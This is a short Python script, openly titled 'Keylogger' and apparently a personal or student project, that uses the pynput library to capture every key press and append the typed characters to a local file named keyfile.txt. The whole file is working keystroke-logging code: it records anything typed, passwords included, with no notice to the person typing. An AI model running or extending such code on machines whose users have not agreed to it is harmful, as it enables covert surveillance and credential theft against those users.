from pynput import keyboard

#Name: Rory Stiff
#Project: Keylogger
#Date: July 24, 2024

#Function that calculates the key strokes
#on a keyboard. 
def on_press(key):
    print(str(key))
    with open('keyfile.txt', 'a') as keylog:
        try:
            char = key.char
            keylog.write(char)
        except:
            print("Error...")

if __name__ == "__main__":
    listner = keyboard.Listener(on_press=on_press)
    listner.start()
    input()